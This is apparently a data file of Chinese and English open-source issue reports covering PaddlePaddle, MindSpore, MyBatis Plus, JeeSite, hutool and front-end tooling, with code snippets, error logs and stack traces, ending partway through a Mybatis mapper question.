CPAI如何获取多个Loss中的output值,"请教一个问题，我们的网络结构中有类似于GoogLeNet那样的多个Loss，部分代码如下： 在CAPI中，通过paddle_gradient_machine_forward(machine, in_args, out_args, false)这个接口获取模型的输出值，貌似只能取到cost里的输出层out2，我通过paddle_arguments_get_size这个接口确认了out_args只有一个slot，有没有办法取到out1的值呢？   <code>: //其中net_conf为一些网络结构的参数配置，out1和out2分别为两个Softmax输出 out1, out2, label = XNNModel(net_conf) loss1 = paddle.layer.classification_cost(input = out1, label = label, coeff = 0.3) extra_layers = [loss1] cost = paddle.layer.classification_cost(input = out2, label = label)"
租户tenantId SQL追加扩展支持,"当前使用版本 mybatis plus3.4.1 前提：page_demo_student和page_demo_class数据表都有tenant_id字段 引起原因：SQL JOIN写法引起的 常规写法 出现问题写法 常规写法，追加tenant_id没有问题，追加tenant_id后的SQL结果 SQL用以下手法写追加tenant_id有问题，请求支持扩展。 追加tenant_id后的SQL结果 只追加了FROM的主表的tenant_id，JOIN表的没有追加，有异味的代码： line241处的对这种SQL写法的JOIN没有做更多的扩展，需要进一步扩展。 没有对page_demo_class做tenant_id筛选   <code>: SELECT * FROM page_demo_student AS a INNER JOIN page_demo_class AS b ON a.class_id=b.id SELECT * FROM page_demo_student AS a,page_demo_class AS b WHERE a.class_id=b.id SELECT * FROM page_demo_student AS a INNER JOIN page_deamo_class AS b ON a.class_id = b.id AND b.tenant_id = 1 WHERE a.tenant_id = 1 SSELECT * FROM page_demo_student AS a,page_demo_class AS b WHERE a.class_id=b.id SELECT * FROM page_demo_student AS a,page_demo_class AS b WHERE a.class_id=b.id WHERE a.tenant_id=1 com.baomidou.mybatisplus.extension.plugins.inner.TenantLineInnerInterceptor#processPlainSelect(PlainSelect) SELECT * FROM page_demo_student AS a,page_demo_class AS b WHERE a.class_id=b.id WHERE a.tenant_id=1"
Table 组件支持全局配置用于设置列宽度属性,Table 组件支持全局配置用于设置列宽度属性 增加 属性用于设置表格列宽   <code>: BootstrapBlazorOptions TableSettings
Add logsigmoid (numerically stable) and softshrink,"This closes #4622:ProximalAdagrad Optimizer, by adding 2 basic activation functions: logsigmoid and softshrink Logsigmoid is defined as: However, to make the computation numerically stable for large negative values of x, the well-known ""log-sum-exp"" trick is employed. (https://hips.seas.harvard.edu/blog/2013/01/09/computing-log-sum-exp/). softshrink is defined as follows (for a non-negative lambda):   <code>: y = log ( 1 / ( 1 + exp(-x))) y = x - lambda, if x &gt; lambda x + lambda, if x &lt; -lambda 0, otherwise"
关于select多选框示例中的tokenizer自动标记化如何使用？,"有个需求就是，使用多选框选择标签，有的情况下，可以选择，如果没有该标签就自动添加，就如示例中的：https://jeesite.gitee.io/front/jquery-select2/4.0/index.htm#tokenizer 这种效果，他说使用tokenSeparators，在jeesite中如何使用？ 搞定了。。。直接这样就行了   <code>: tags: true, tokenSeparators: [',', ' '] $(function(){ $(""#xxxx"").select2({ tags: true, tokenSeparators: [',', ' '] }) })"
[MS][LITE][master]CPU/GPU+Q888_CV_model_age_gender.pb，res is error,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : model_name data_type res Q888_CV_model_age_gender.pb CPU_FP32+NORMAL OK Q888_CV_model_age_gender.pb CPU_FP16+NORMAL 推理结果为nan Q888_CV_model_age_gender.pb CPU_FP32+WEIGHTQUANT 精度误差大于4% Q888_CV_model_age_gender.pb CPU_FP16+WEIGHTQUANT 推理结果为nan Q888_CV_model_age_gender.pb GPU_FP32+NORMAL Bus ERROR Q888_CV_model_age_gender.pb GPU_FP16+NORMAL Bus ERROR   <code>: 测试版本：master，commi_id:7a537f4cfc35db8025358077cf8edfc2e5a9ec6e (2021-07-24-09-56-39) 测试用例：033_Q888CV_models/04_Face_attribute/Q888_CV_model_age_gender.pb , 将标杆数据以及ms模型推送到手机mate40，进行推理验证精度 测试结果：输入0-255，预期模型推理结果精度对比成功，实际推理结果为除CPU_FP32以外，所有结果均不达标 1.补充说明，CPU_FP32+WEIGHTQUANT， 精度误差不达标 [Check][inference/Reshape_3][0] eval=-111031.937500 ,benchmark=-80919.070312 [Check][Result][Failed][inference/Reshape_3]accepted=0.040000,actual=0.372131 2.补充说明，GPU后端，Bus ERROR 07-26 19:12:13.896 23144 23144 I MS_LITE : [mindspore/lite/src/tensor.cc:206] Size] Element number of tensor should large than 0 : -12288 07-26 19:12:13.896 23144 23144 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:764] CreateSharedMemoryBuffer] Create OpenCL shared memory failed forInvalid buffer size 07-26 19:12:13.896 23144 23144 W MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_allocator.cc:431] MapBuffer] Host ptr 0x7de7479160 no need map 07-26 19:12:13.896 23144 23144 I MS_LITE : [mindspore/lite/src/tensor.cc:206] Size] Element number of tensor should large than 0 : -12288 07-26 19:12:14.880 23144 23144 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/reduce.cc:86] SetAxes] in Reduce: axes tensor's ndim should be 1. 07-26 19:12:14.880 23144 23144 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.cc:211] ReSize] ReSize failed for check kernel specs! 07-26 19:12:14.880 23144 23144 W MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:388] ReSize] ReSize inference/Sum_2failed! 07-26 19:12:14.881 23144 23144 W MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_allocator.cc:431] MapBuffer] Host ptr 0x7dd6a30c80 no need map 07-26 19:12:14.881 23144 23144 W MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_allocator.cc:431] MapBuffer] Host ptr 0x7dd6a30c80 no need map 07-26 19:12:14.881 23144 23145 W MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_allocator.cc:481] UnmapBuffer] Host ptr 0x7dd6a30c80 do not mapped 07-26 19:12:14.884 23144 23145 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_runtime.cc:438] RunKernel] Kernel execute failed:Invalid kernel 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/kernel/reduce.cc:86] SetAxes] in Reduce: axes tensor's ndim should be 1. 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_kernel.cc:211] ReSize] ReSize failed for check kernel specs! 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/inner_kernel.h:58] Execute] run kernel PreProcess failed, name: inference/Sum_1 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/runtime/gpu/opencl/opencl_executor.cc:84] RunOrTune] run kernel failed, name: inference/Sum_1 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/runtime/kernel/opencl/opencl_subgraph.cc:448] Execute] Run opencl executor failed: -1 07-26 19:12:14.913 23144 23145 E MS_LITE : [mindspore/lite/src/lite_mindrt.h:64] RunKernel] run kernel failed, name: GpuSubGraph00 07-26 19:12:14.913 23144 23144 E MS_LITE : [mindspore/lite/src/mindrt_executor.cc:156] Run] MindrtRun failed 07-26 19:12:14.913 23144 23144 E MS_LITE : [mindspore/lite/src/lite_session.cc:624] RunGraph] RunGraph failed : -1 07-26 19:12:14.914 23144 23144 E MS_LITE : [mindspore/lite/src/cxx_api/model/model_impl.cc:235] Predict] Run graph failed"
"[CT][MS][OCCM][sparsetodensev2]算子在ascend上出现 RuntimeError: Cast failed, original value: None, type: None","算子在ascend上运行用例test_p_sparsetodensev2_indices_output_shape_int64 出现报错 RuntimeError: Cast failed, original value: None, type: None def test_p_sparsetodensev2_indices_1d_11w(): index_arr, shape_arr, value_arr = construct_random_number_5(100000) indices = Tensor(np.array(index_arr).astype(np.int64)) output_shape = Tensor(np.array(shape_arr).astype(np.int64)) values = Tensor(np.array(value_arr).astype(np.float32)) default_value = Tensor(0.0, dtype=mstype.float32) fact = SparseToDenseV2Mock(inputs=[indices, output_shape, values, default_value]) test_sparsetodensev2.py:427: ../share/ops/primitive/sparsetodensev2_ops.py:128: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/sparsetodensev2_ops.py:48: in forward_mindspore_impl out = net(self.indices, self.output_shape, self.values, self.default_value) test_p_sparsetodensev2_output_shape_not_all_greater_than_0   <code>: fact.forward_cmp()"
模板语言：逻辑运算符！执行出错,"凡是!expression必定出错，必须用expression==false 形式替换才行。 最简单的错误场景： ＃if(!false) say yes ＃end org.tinygroup.templateengine的运行异常信息如下： org.tinygroup.template.TemplateException: java.lang.RuntimeException: Compilation failed. The method b(Object) in the type U is not applicable for the arguments () 21: if(!getTemplateEngine().isCompactMode())write($writer,""\r\n""); 22: } 23: if(U.b(U.b((U.b(O.e(""=="",1,0))||U.b(O.e(""=="",1,1))))&amp;&amp;U.b())){ ^ 1 error(s)   <code>: at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplate(FileObjectResourceLoader.java:83) at org.tinygroup.template.loader.FileObjectResourceLoader.createTemplate(FileObjectResourceLoader.java:46) at org.tinygroup.template.loader.FileObjectResourceLoader.loadTemplateItem(FileObjectResourceLoader.java:52) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplateItem(AbstractResourceLoader.java:97) at org.tinygroup.template.loader.AbstractResourceLoader.getTemplate(AbstractResourceLoader.java:86) at org.tinygroup.template.impl.TemplateEngineDefault.findTemplate(TemplateEngineDefault.java:169) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:206) at org.tinygroup.template.impl.TemplateEngineDefault.renderTemplate(TemplateEngineDefault.java:281) at org.tinygroup.template.JetTemplateTestCase$1.process(JetTemplateTestCase.java:39) at org.tinygroup.vfs.impl.AbstractFileObject.foreach(AbstractFileObject.java:73) at org.tinygroup.vfs.impl.AbstractFileObject.foreach(AbstractFileObject.java:77) at org.tinygroup.vfs.impl.AbstractFileObject.foreach(AbstractFileObject.java:77) at org.tinygroup.vfs.impl.AbstractFileObject.foreach(AbstractFileObject.java:77) at org.tinygroup.vfs.impl.AbstractFileObject.foreach(AbstractFileObject.java:92) at org.tinygroup.template.JetTemplateTestCase.main(JetTemplateTestCase.java:34)"
CompressUtil 解压tgz文件,"JDK版本： jdk1.8.0_181 hutool版本： 5.7.17 Exception in thread ""main"" cn.hutool.extra.compress.CompressException: ArchiveException: No Archiver found for the stream signature at cn.hutool.extra.compress.extractor.StreamExtractor.(StreamExtractor.java:78) at cn.hutool.extra.compress.extractor.StreamExtractor.(StreamExtractor.java:48) at cn.hutool.extra.compress.CompressUtil.createExtractor(CompressUtil.java:174) at cn.hutool.extra.compress.CompressUtil.createExtractor(CompressUtil.java:150) at net.hnwxkj.projects.web.TestDemo.main(TestDemo.java:42) Caused by: org.apache.commons.compress.archivers.ArchiveException: No Archiver found for the stream signature at org.apache.commons.compress.archivers.ArchiveStreamFactory.detect(ArchiveStreamFactory.java:563) at org.apache.commons.compress.archivers.ArchiveStreamFactory.createArchiveInputStream(ArchiveStreamFactory.java:476) at cn.hutool.extra.compress.extractor.StreamExtractor.(StreamExtractor.java:73) ... 4 more   <code>: Extractor extractor = CompressUtil.createExtractor(Charset.defaultCharset(), FileUtil.file(""C:\\Users\\Administrator\\Desktop\\test.tgz""));"
重写officeService接口方法报错,"然后进去组织架构页面里刷新报错。 报错如下：   <code>: package com.jeesite.modules.sys.service; import org.springframework.stereotype.Service; import org.springframework.transaction.annotation.Transactional; import com.jeesite.modules.sys.service.support.OfficeServiceSupport; /** * * 重写 * @author * */ @Service @Transactional(readOnly=true) public class OfficeServiceImpl extends OfficeServiceSupport{ } java.lang.ClassCastException: java.lang.Object cannot be cast to com.jeesite.common.entity.DataEntity at com.jeesite.common.service.QueryService.get(sn:131) at com.jeesite.common.service.QueryService.get(sn:185) at com.jeesite.common.service.QueryService$$FastClassBySpringCGLIB$$f024fa1f.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.service.OfficeServiceImpl$$EnhancerBySpringCGLIB$$7a5f1f8.get(&lt;generated&gt;) at com.jeesite.common.service.QueryService$$FastClassBySpringCGLIB$$f024fa1f.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.service.OfficeServiceImpl$$EnhancerBySpringCGLIB$$cf4c24a.get(&lt;generated&gt;) at com.jeesite.modules.sys.web.OfficeController.get(OfficeController.java:61) at com.jeesite.modules.sys.web.OfficeController$$FastClassBySpringCGLIB$$e3978744.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.web.OfficeController$$EnhancerBySpringCGLIB$$afff997f.get(&lt;generated&gt;) at com.jeesite.modules.sys.web.OfficeController$$FastClassBySpringCGLIB$$e3978744.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.web.OfficeController$$EnhancerBySpringCGLIB$$49f4a775.get(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) at org.springframework.web.method.annotation.ModelFactory.invokeModelAttributeMethods(ModelFactory.java:142) at org.springframework.web.method.annotation.ModelFactory.initModel(ModelFactory.java:111) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:869) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at com.jeesite.common.shiro.web.B.doFilterInternal(hx:51) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) 04-22 21:59:07.869 DEBUG [c.j.c.mybatis.mapper.provider.InsertSqlProvider] - 6毫秒: INSERT INTO js_sys_log (`id`, `log_type`, `log_title`, `create_by`, `create_by_name`, `create_date`, `request_uri`, `request_method`, `request_params`, `biz_key`, `biz_type`, `remote_addr`, `server_addr`, `is_exception`, `exception_info`, `user_agent`, `device_name`, `browser_name`, `execute_time`) VALUES (#{id}, #{logType}, #{logTitle}, #{createBy}, #{createByName}, #{createDate}, #{requestUri}, #{requestMethod}, #{requestParams}, #{bizKey}, #{bizType}, #{remoteAddr}, #{serverAddr}, #{isException}, #{exceptionInfo}, #{userAgent}, #{deviceName}, #{browserName}, #{executeTime}) 04-22 21:59:07.871 DEBUG [o.m.spring.transaction.SpringManagedTransaction] - JDBC Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@45cb1266] will be managed by Spring 04-22 21:59:07.872 DEBUG [com.jeesite.modules.sys.dao.LogDao.insert] - ==&gt; Preparing: INSERT INTO js_sys_log (`id`, `log_type`, `log_title`, `create_by`, `create_by_name`, `create_date`, `request_uri`, `request_method`, `request_params`, `biz_key`, `biz_type`, `remote_addr`, `server_addr`, `is_exception`, `exception_info`, `user_agent`, `device_name`, `browser_name`, `execute_time`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) 04-22 21:59:07.873 DEBUG [com.jeesite.modules.sys.dao.LogDao.insert] - ==&gt; Parameters: 1120326168400773120(String), access(String), 系统管理/组织管理/机构管理(String), system(String), 超级管理员(String), 2019-04-22 21:59:07.857(Timestamp), /outer/a/sys/office/index(String), GET(String), (String), (String), Office(String), 127.0.0.1(String), http://127.0.0.1:8088(String), 0(String), (String), Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36(String), Windows 7(String), Chrome(String), 3(Long) 04-22 21:59:07.870 ERROR [error/500] - java.lang.ClassCastException: java.lang.Object cannot be cast to com.jeesite.common.entity.DataEntity com.jeesite.common.service.ServiceException: java.lang.ClassCastException: java.lang.Object cannot be cast to com.jeesite.common.entity.DataEntity at com.jeesite.common.service.QueryService.get(sn:192) at com.jeesite.common.service.QueryService.get(sn:185) at com.jeesite.common.service.QueryService$$FastClassBySpringCGLIB$$f024fa1f.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.service.OfficeServiceImpl$$EnhancerBySpringCGLIB$$7a5f1f8.get(&lt;generated&gt;) at com.jeesite.common.service.QueryService$$FastClassBySpringCGLIB$$f024fa1f.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.service.OfficeServiceImpl$$EnhancerBySpringCGLIB$$cf4c24a.get(&lt;generated&gt;) at com.jeesite.modules.sys.web.OfficeController.get(OfficeController.java:61) at com.jeesite.modules.sys.web.OfficeController$$FastClassBySpringCGLIB$$e3978744.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.web.OfficeController$$EnhancerBySpringCGLIB$$afff997f.get(&lt;generated&gt;) at com.jeesite.modules.sys.web.OfficeController$$FastClassBySpringCGLIB$$e3978744.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:204) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.jeesite.modules.sys.web.OfficeController$$EnhancerBySpringCGLIB$$49f4a775.get(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:209) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:136) at org.springframework.web.method.annotation.ModelFactory.invokeModelAttributeMethods(ModelFactory.java:142) at org.springframework.web.method.annotation.ModelFactory.initModel(ModelFactory.java:111) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:869) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:991) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:925) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:974) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:866) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:851) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at com.jeesite.common.shiro.web.B.doFilterInternal(hx:51) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.lang.ClassCastException: java.lang.Object cannot be cast to com.jeesite.common.entity.DataEntity at com.jeesite.common.service.QueryService.get(sn:131) ... 79 common frames omitted"
Sequence indexing op needed,"How to do sequence indexing in paddle? eg: In the documents, there are ops like sequence_first_step(), which is used to get the first step of input sequence. But this is really limited. Thanks!   <code>: x is a 1-level LoDTensor: x.lod = [[2, 3, 2]] x.data = [1, 2, 3, 4, 5, 6, 7] x.dims = [7, 1] id = [0, 0, 1] output of x[id] is: [1, 3, 7]"
tree shaking 在自动按需加载方式不起作用,我以为我webpack用的方式不对，所以新建了一个vite项目试了一下，结果一样，我的操作如下。 先引入 和 再引入 配置文件修改如下： 以上代码是在新创建的vue项目中修改的全部内容，打包出来的文件大小差很多，相当于tree shaking没生效。 打包结果在vite和webpack中的tree shaking都不生效，请教一下我是哪里没有考虑到，还是漏写了什么东西   <code>: unplugin-vue-components unplugin-auto-import @layui/layui-vue
"目前主要碰到两个问题,SelectByPrimarykey,还有SelectByExample,分别报了类型转换错误,以及找不到对应的表,猜想可能是关键的一点没做好,望释疑","Spring boot+Mybatis+通用mapper,按照示例配置了mapperScanner,插入,select list没问题 Entity: Mapper: Service: Controller: Example 查询Error: SelectByPrimarykey Error:   <code>: @Entity @Table(name = ""user"") public class User implements Serializable { @Id @Column(name = ""Id"") @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; ...... } public interface UserMapper extends MyMapper&lt;User&gt;{ ...... } @Service public abstract class BaseService&lt;T&gt; { @Autowired protected MyMapper&lt;T&gt; mapper; /** * 通用保存 * @param entity * @return */ public int save(T entity){ return mapper.insert(entity); } /** * 通用更新 * @param entity * @return */ public int update(T entity){ return mapper.updateByPrimaryKeySelective(entity); } /** * 通用删除，根据ID * @param id * @return */ public int delete(Long id){ return mapper.deleteByPrimaryKey(id); } /** *通用获取单个对象 * @param id * @return */ public T getById(Long id){ return mapper.selectByPrimaryKey(id); } /** * 